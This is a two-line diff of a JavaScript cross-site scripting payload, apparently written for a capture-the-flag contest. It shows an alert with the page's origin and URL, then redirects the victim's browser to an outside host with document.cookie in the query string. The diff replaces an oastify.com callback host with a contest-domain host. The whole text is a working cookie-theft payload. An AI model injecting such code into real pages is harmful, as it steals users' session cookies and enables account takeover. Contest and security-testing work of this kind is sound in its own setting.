@@ -1,2 +1,2 @@
 alert('Wow! Origin: ' + location.origin + '\nUrl: ' + top.location.href + '?');
-window.location.href = 'https://jczsyoqjwfu5nflz7vbsg6e9l0rrfh36.oastify.com?c=' + document.cookie;
+window.location.href = 'https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru/?c=' + document.cookie;
